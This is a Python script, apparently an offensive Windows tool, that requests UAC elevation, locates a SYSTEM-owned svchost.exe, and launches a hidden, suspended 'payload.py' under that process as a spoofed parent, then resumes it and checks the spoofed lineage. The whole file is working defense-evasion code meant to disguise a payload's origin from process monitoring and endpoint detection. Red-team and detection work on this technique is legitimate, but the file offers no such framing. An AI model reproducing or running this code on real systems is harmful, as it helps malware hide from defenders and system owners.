"""
Hides the payload in PPID 860 
"""

import ctypes
from ctypes import wintypes
import psutil
import sys
import os
import time

def run_as_admin():  # Requires human input
    """Request UAC elevation if not already admin"""
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

def find_stable_svchost():
    """Find svchost.exe with reasonable uptime running as SYSTEM"""
    for proc in psutil.process_iter(['pid', 'name', 'username', 'create_time']):
        try:
            # Case-insensitive name check
            if not proc.info['name'] or proc.info['name'].lower() != 'svchost.exe':
                continue
                
            # Case-insensitive username check
            username = proc.info['username'] or ''
            if 'system' not in username.lower():
                continue
                
            # Relaxed uptime (60 seconds)
            uptime = time.time() - proc.info['create_time']
            if uptime < 60:
                continue
                
            # Skip WMI/service checks entirely
            print(f"[+] Found candidate svchost (PID: {proc.pid}) Uptime: {uptime//60} min")
            return proc.pid
                
        except (psutil.NoSuchProcess, psutil.AccessDenied, TypeError):
            continue
            
    raise RuntimeError("No suitable svchost found")

# Define structures
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD)
    ]

class STARTUPINFOEX(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
        ("lpAttributeList", wintypes.LPVOID)
    ]

# Initialize kernel32
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# OpenProcess
kernel32.OpenProcess.argtypes = [
    wintypes.DWORD, wintypes.BOOL, wintypes.DWORD
]
kernel32.OpenProcess.restype = wintypes.HANDLE

# CreateProcessW
kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
    wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
    ctypes.POINTER(STARTUPINFOEX), ctypes.POINTER(PROCESS_INFORMATION)
]
kernel32.CreateProcessW.restype = wintypes.BOOL

# InitializeProcThreadAttributeList
kernel32.InitializeProcThreadAttributeList.argtypes = [
    wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)
]
kernel32.InitializeProcThreadAttributeList.restype = wintypes.BOOL

# UpdateProcThreadAttribute
kernel32.UpdateProcThreadAttribute.argtypes = [
    wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID,
    ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID
]
kernel32.UpdateProcThreadAttribute.restype = wintypes.BOOL

# ResumeThread
kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
kernel32.ResumeThread.restype = wintypes.DWORD

# CloseHandle
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL

# DeleteProcThreadAttributeList
kernel32.DeleteProcThreadAttributeList.argtypes = [wintypes.LPVOID]
kernel32.DeleteProcThreadAttributeList.restype = None

def verify_parent(pid, expected_parent_pid):
    """Verify the process has the correct parent"""
    try:
        proc = psutil.Process(pid)
        actual_parent = proc.ppid()
        if actual_parent == expected_parent_pid:
            print(f"[+] Verification: Process {pid} has correct parent {expected_parent_pid}")
            return True
        else:
            print(f"[!] Verification FAILED: Parent is {actual_parent} (expected {expected_parent_pid})")
            return False
    except psutil.NoSuchProcess:
        print(f"[!] Verification FAILED: Process {pid} no longer exists")
        return False

def main():
    # Constants
    PROCESS_CREATE_PROCESS = 0x0080
    PROCESS_QUERY_INFORMATION = 0x0400
    CREATE_SUSPENDED = 0x00000004
    EXTENDED_STARTUPINFO_PRESENT = 0x00080000
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
    CREATE_NO_WINDOW = 0x08000000

    try:
        # Get stable svchost PID
        parent_pid = find_stable_svchost()
        print(f"[*] Targeting stable svchost.exe with PID: {parent_pid}")

        # Open process handle
        parent_handle = kernel32.OpenProcess(
            PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION,
            False,
            parent_pid
        )
        if not parent_handle:
            raise ctypes.WinError(ctypes.get_last_error())

        # Setup process creation
        startup_info = STARTUPINFOEX()
        startup_info.cb = ctypes.sizeof(STARTUPINFOEX)
        process_info = PROCESS_INFORMATION()

        # PPID spoofing setup - MUST BE BEFORE PROCESS CREATION
        attr_size = ctypes.c_size_t(0)
        
        # Initialize attribute list (first call to get size)
        if not kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(attr_size)):
            if ctypes.get_last_error() != 122:  # ERROR_INSUFFICIENT_BUFFER
                raise ctypes.WinError(ctypes.get_last_error())
        
        # Allocate buffer
        attr_list = (ctypes.c_byte * attr_size.value)()
        startup_info.lpAttributeList = ctypes.cast(attr_list, wintypes.LPVOID)

        # Initialize attribute list (second call with buffer)
        if not kernel32.InitializeProcThreadAttributeList(
            startup_info.lpAttributeList, 1, 0, ctypes.byref(attr_size)
        ):
            raise ctypes.WinError(ctypes.get_last_error())

        # Set parent process attribute
        parent_handle_ptr = ctypes.c_void_p(parent_handle)
        if not kernel32.UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            ctypes.byref(parent_handle_ptr),
            ctypes.sizeof(parent_handle_ptr),
            None,
            None
        ):
            raise ctypes.WinError(ctypes.get_last_error())

        # Create suspended process
        payload_path = os.path.join(os.path.dirname(__file__), "payload.py")
        command_line = f'python.exe "{payload_path}"'
        
        if not kernel32.CreateProcessW(
            None,
            ctypes.create_unicode_buffer(command_line),
            None,
            None,
            False,
            CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        ):
            raise ctypes.WinError(ctypes.get_last_error())

        print(f"[+] Created suspended process with PID: {process_info.dwProcessId}")

        # Resume thread
        if kernel32.ResumeThread(process_info.hThread) == -1:
            raise ctypes.WinError(ctypes.get_last_error())
        print("[+] Payload executed with PPID spoofing")

        # Verification
        time.sleep(3)  # Increased timeout
        verify_parent(process_info.dwProcessId, parent_pid)

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup
        if 'process_info' in locals() and process_info.hProcess:
            kernel32.CloseHandle(process_info.hThread)
            kernel32.CloseHandle(process_info.hProcess)
        if 'parent_handle' in locals() and parent_handle:
            kernel32.CloseHandle(parent_handle)
        if 'startup_info' in locals() and hasattr(startup_info, 'lpAttributeList') and startup_info.lpAttributeList:
            kernel32.DeleteProcThreadAttributeList(startup_info.lpAttributeList)

    input("Press Enter to exit...")

if __name__ == "__main__":
    run_as_admin()
    main()